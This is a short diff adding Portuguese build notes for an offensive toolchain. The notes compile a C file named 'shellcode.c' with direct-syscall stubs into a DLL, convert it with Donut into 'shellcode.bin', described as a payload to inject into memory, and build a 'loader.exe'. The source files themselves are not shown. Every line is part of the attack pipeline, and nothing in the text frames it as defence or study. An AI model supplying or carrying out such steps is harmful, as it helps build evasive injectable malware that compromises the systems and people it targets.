@@ -1,0 +1,23 @@
+Transformar isso em shellcode
+
+Compilar como DLL e usar Donut para gerar shellcode.
+
+gcc -shared -o payload.dll shellcode.c syscalls/syscalls.c syscalls/syscalls.asm -masm=intel
+
+Depois:
+
+donut payload.dll -o shellcode.bin -e MainThread
+
+Isso cria shellcode.bin, payload que podemos injetar na memória.
+
+
+Como compilar
+
+gcc -c syscalls/syscalls.c -masm=intel
+gcc -c shellcode.c -masm=intel
+gcc -shared -o payload.dll shellcode.o syscalls.o syscalls/syscalls.asm
+
+donut payload.dll -o shellcode.bin -e MainThread
+
+gcc -o loader.exe loader.c
+
